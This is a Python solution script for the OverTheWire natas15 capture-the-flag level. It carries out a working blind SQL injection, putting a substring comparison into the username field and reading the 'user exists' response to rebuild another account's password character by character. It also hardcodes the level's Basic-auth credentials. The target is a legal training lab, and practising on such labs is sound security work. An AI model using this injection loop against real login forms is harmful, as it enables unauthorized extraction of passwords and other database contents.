import requests
import string

headers = {"Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="}
url = "http://natas15.natas.labs.overthewire.org"

password = ""
count = 1
length = 32
chars = string.digits + string.ascii_letters

while count <= length:
    for c in chars:
        payload = {"username":"natas16\" AND binary substring(password,1," + str(count) + ") = \"" + password + c}
        response = requests.post(url, data=payload, headers=headers, verify=False) 

        if "This user exists." in response.text:
            password += c
            count += 1
            print("[+] Found char: " + c + " Password: " + password) 
            break

print("[+} Done!")
